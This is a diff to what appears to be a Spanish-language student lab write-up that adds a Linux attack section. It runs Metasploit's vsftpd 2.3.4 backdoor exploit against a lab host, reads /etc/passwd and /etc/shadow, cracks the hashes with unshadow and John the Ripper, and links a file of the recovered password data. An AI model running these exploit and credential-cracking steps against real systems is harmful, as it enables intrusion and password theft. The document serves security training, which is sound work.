@@ -166,7 +166,29 @@ meterpreter > hasdump
 ```
 ![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/Ataque%20involucrando%20al%20usuario/2%20(getting%20passwords'%20encripted).png)
 
+## Linux 
+```
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(vsftpd_234_backdoor) > set RHOST 10.20.1.12
+RHOST => 10.20.1.12
+msf exploit(vsftpd_234_backdoor) > exploit
+```
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/desde%20linux/first%20part.png)
 
+```
+cat /etc/passwd
+```
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/desde%20linux/cat%20-etc-passwd.png)
 
-
-
+```
+cat /etc/shadow
+```
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/desde%20linux/cat%20-etc-shadow.png)
+```
+unshadow meta_passwd meta_shadow > meta_unshadow 
+john -wordlist=/usr/share/john/password.lst  meta_unshadow 
+john --show meta_unshadow  
+```
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/desde%20linux/unshadow%20meta_passwd%20meta_shadow%20--%20meta_unshadow%20.png)
+Archivos de contraseñas: 
+https://github.com/DaaGeney/RepoCiber/blob/master/Practica%202/Archivos/meta_unshadow.txt 
